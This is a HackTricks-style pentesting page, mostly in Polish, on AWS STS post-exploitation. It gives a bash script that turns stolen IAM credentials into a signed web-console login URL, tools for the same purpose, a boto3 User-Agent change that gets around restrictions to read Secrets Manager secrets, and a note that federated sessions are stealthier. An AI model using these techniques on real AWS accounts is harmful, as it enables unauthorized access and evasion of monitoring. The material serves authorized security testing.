# AWS - STS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## STS

Więcej informacji:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### From IAM Creds to Console

Jeśli udało ci się pozyskać poświadczenia IAM, możesz być zainteresowany **accessing the web console** używając następujących narzędzi.\
Zwróć uwagę, że użytkownik/rola musi mieć uprawnienie **`sts:GetFederationToken`**.

#### Własny skrypt

Poniższy skrypt użyje domyślnego profilu i domyślnej lokalizacji AWS (not gov and not cn), aby wygenerować podpisany URL, którego możesz użyć, aby zalogować się w web console:
```bash
# Get federated creds (you must indicate a policy or they won't have any perms)
## Even if you don't have Admin access you can indicate that policy to make sure you get all your privileges
## Don't forget to use [--profile <prof_name>] in the first line if you need to
output=$(aws sts get-federation-token --name consoler --policy-arns arn=arn:aws:iam::aws:policy/AdministratorAccess)

if [ $? -ne 0 ]; then
echo "The command 'aws sts get-federation-token --name consoler' failed with exit status $status"
exit $status
fi

# Parse the output
session_id=$(echo $output | jq -r '.Credentials.AccessKeyId')
session_key=$(echo $output | jq -r '.Credentials.SecretAccessKey')
session_token=$(echo $output | jq -r '.Credentials.SessionToken')

# Construct the JSON credentials string
json_creds=$(echo -n "{\"sessionId\":\"$session_id\",\"sessionKey\":\"$session_key\",\"sessionToken\":\"$session_token\"}")

# Define the AWS federation endpoint
federation_endpoint="https://signin.aws.amazon.com/federation"

# Make the HTTP request to get the sign-in token
resp=$(curl -s "$federation_endpoint" \
--get \
--data-urlencode "Action=getSigninToken" \
--data-urlencode "SessionDuration=43200" \
--data-urlencode "Session=$json_creds"
)
signin_token=$(echo -n $resp | jq -r '.SigninToken' | tr -d '\n' | jq -sRr @uri)


# Give the URL to login
echo -n "https://signin.aws.amazon.com/federation?Action=login&Issuer=example.com&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F&SigninToken=$signin_token"
```
#### aws_consoler

Możesz **wygenerować link do konsoli webowej** za pomocą [https://github.com/NetSPI/aws_consoler](https://github.com/NetSPI/aws_consoler).
```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #This will generate a link to login into the console
```
> [!WARNING]
> Upewnij się, że użytkownik IAM ma uprawnienie `sts:GetFederationToken`, lub udostępnij rolę do objęcia.

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) jest narzędziem do bezpiecznego przechowywania i uzyskiwania dostępu do poświadczeń AWS w środowisku deweloperskim.
```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute aws cli with jonsmith creds
aws-vault login jonsmith # Open a browser logged as jonsmith
```
> [!NOTE]
> Możesz także użyć **aws-vault** aby uzyskać **sesję konsoli w przeglądarce**

### **Ominięcie ograniczeń User-Agent w Pythonie**

Jeżeli istnieje ograniczenie wykonywania niektórych akcji w oparciu o używany user agent (np. ograniczające użycie biblioteki python boto3 na podstawie user agenta), można użyć poprzedniej techniki, aby połączyć się z web console za pomocą przeglądarki, lub można bezpośrednio zmodyfikować boto3 user-agent przez wykonanie:
```bash
# Shared by ex16x41
# Create a client
session = boto3.Session(profile_name="lab6")
client = session.client("secretsmanager", region_name="us-east-1")

# Change user agent of the client
client.meta.events.register( 'before-call.secretsmanager.GetSecretValue', lambda params, **kwargs: params['headers'].update({'User-Agent': 'my-custom-tool'}) )

# Perform the action
response = client.get_secret_value(SecretId="flag_secret") print(response['SecretString'])
```
### **`sts:GetFederationToken`**

Dzięki temu uprawnieniu możliwe jest utworzenie tożsamości federacyjnej dla użytkownika, który je wywołuje, ograniczonej do uprawnień, jakie posiada ten użytkownik.
```bash
aws sts get-federation-token --name <username>
```
Token zwrócony przez sts:GetFederationToken należy do tożsamości federowanej wywołującego użytkownika, ale z ograniczonymi uprawnieniami. Nawet jeśli użytkownik ma uprawnienia administratora, niektórych operacji, takich jak wyświetlanie listy użytkowników IAM czy dołączanie polityk, nie można wykonać za pomocą tokena federowanego.

Dodatkowo ta metoda jest nieco bardziej dyskretna, ponieważ użytkownik federowany nie pojawia się w AWS Portal — można go obserwować jedynie poprzez logi CloudTrail lub narzędzia monitorujące.

{{#include ../../../../banners/hacktricks-training.md}}
